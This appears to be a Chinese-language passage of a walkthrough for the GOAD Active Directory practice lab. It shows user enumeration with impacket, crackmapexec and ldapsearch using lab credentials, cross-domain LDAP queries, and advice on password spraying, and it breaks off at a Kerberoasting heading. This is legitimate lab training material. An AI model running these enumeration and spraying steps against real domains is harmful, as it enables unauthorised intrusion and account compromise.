# GOAD 用户枚举
## 列出用户
* 当您在活动目录上获得一个帐户时，要做的第一件事总是**获得完整的用户列表**
* 一旦你得到它，你就可以在完整的用户列表上进行密码喷射(你经常会发现其他帐户的密码很弱，比如 username=password、SeasonYear!、SocietynameYear! 甚至 123456)
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
```
```bash
mpacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2023-05-31 01:24:31.039750  2023-05-31 05:57:19.443577 
Guest                                                 <never>              <never>             
vagrant                                               2021-05-12 07:38:55.922520  2023-05-31 06:22:46.154533 
krbtgt                                                2023-05-31 02:09:14.783719  <never>             
                                                      2023-05-31 02:19:15.062141  <never>             
arya.stark                                            2023-05-31 05:43:29.046383  2023-06-02 05:09:00.415651 
eddard.stark                                          2023-05-31 05:43:35.293315  2023-06-05 09:52:09.638037 
catelyn.stark                                         2023-05-31 05:43:41.067220  <never>             
robb.stark                                            2023-05-31 05:43:46.748632  2023-06-05 09:52:42.283337 
sansa.stark                                           2023-05-31 05:43:52.494612  <never>             
brandon.stark                                         2023-05-31 05:43:58.041093  2023-06-04 09:56:34.712310 
rickon.stark                                          2023-05-31 05:44:04.184710  <never>             
hodor                                                 2023-05-31 05:44:09.894722  <never>             
jon.snow                                              2023-05-31 05:44:15.433758  <never>             
samwell.tarly                                         2023-05-31 05:44:20.807653  <never>             
jeor.mormont                                          2023-05-31 05:44:25.852727  <never>             
sql_svc                                               2023-05-31 05:44:31.405820  2023-06-01 20:36:30.667229 
```
使用CME
```bash
crackmapexec smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users
```
```bash
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        badpwdcount: 3 desc: sql service
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   badpwdcount: 3 desc: Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  badpwdcount: 3 desc: Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       badpwdcount: 3 desc: Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          badpwdcount: 0 desc: Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   badpwdcount: 3 desc: Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  badpwdcount: 3 desc: Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    badpwdcount: 3 desc: Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\robb.stark                     badpwdcount: 0 desc: Robb Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\catelyn.stark                  badpwdcount: 3 desc: Catelyn Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\eddard.stark                   badpwdcount: 0 desc: Eddard Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     badpwdcount: 3 desc: Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\krbtgt                         badpwdcount: 3 desc: Key Distribution Center Service Account
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\vagrant                        badpwdcount: 0 desc: Vagrant User
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          badpwdcount: 3 desc: Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Administrator                  badpwdcount: 3 desc: Built-in account for administering the computer/domain
```
使用LDAP
[Useful LDAP queries for Windows Active Directory pentesting](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)
```bash
ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```
```bash
distinguishedName: CN=Administrator,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=Guest,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=SEVENKINGDOMS$,CN=Users,DC=north,DC=sevenkingdoms,DC=loc
distinguishedName: CN=arya.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=eddard.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=catelyn.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=robb.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sansa.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=brandon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=rickon.stark,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=hodor,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=jon.snow,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=samwell.tarly,CN=Users,DC=north,DC=sevenkingdoms,DC=loca
distinguishedName: CN=jeor.mormont,CN=Users,DC=north,DC=sevenkingdoms,DC=local
distinguishedName: CN=sql_svc,CN=Users,DC=north,DC=sevenkingdoms,DC=local
```
而且由于域信任的关系 我们可以使用ldap查询其他域内的用户
```bash
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
```
```bash
ldap_bind: Invalid credentials (49)
	additional info: 80090308: LdapErr: DSID-0C09042A, comment: AcceptSecurityContext error, data 52e, v3839
```
```bash
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
```
```bash
distinguishedName: CN=Administrator,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=Guest,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=vagrant,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=krbtgt,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=NORTH$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=ESSOS$,CN=Users,DC=sevenkingdoms,DC=local
distinguishedName: CN=tywin.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=jaime.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=cersei.lannister,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=robert.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=joffrey.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=renly.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=stannis.baratheon,OU=Crownlands,DC=sevenkingdoms,DC=loca
distinguishedName: CN=petyer.baelish,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=lord.varys,OU=Crownlands,DC=sevenkingdoms,DC=local
distinguishedName: CN=maester.pycelle,OU=Crownlands,DC=sevenkingdoms,DC=local
```

## Kerberoasting